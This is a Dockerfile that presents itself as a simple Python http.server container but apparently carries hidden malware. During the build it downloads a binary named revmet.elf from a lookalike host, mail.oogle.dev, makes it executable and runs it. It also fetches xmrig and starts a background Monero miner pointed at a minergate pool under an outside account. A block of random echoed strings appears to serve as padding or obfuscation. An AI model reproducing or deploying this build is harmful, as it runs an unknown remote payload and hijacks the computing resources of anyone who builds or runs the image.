FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo fV5UhRmnSnTvfi6i6bAyavYONxQhjU8q pSgSl1vQwi5uwVDn8URhlWDabcWJFTrf Sch6lnMX3cdZk4xw1q7uthmWNzJ89ozb ArytvOQub08GfamGP18fL9v2AOea0zSn P4Wd6y4I0n92CrCIaQwDSlkfhZghPKyk LI9zekuEqhrehuYuqgJ8BN2n5VQxG1QS 0iDg4vJI8BWEWrB04kCQIsVU0QsTConn PAWabQHGVV4DCFs1kGH0IJoJLClr6DC3 Cov5mebm8b52EHANzJWJYjwcrYRDbKRU kVw3NpNRfRFBJAQ7OO8UI4QNTdHcD4Ag jE9FXckTdrZxd6aNNQAeatfmUVcKbRK2 DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]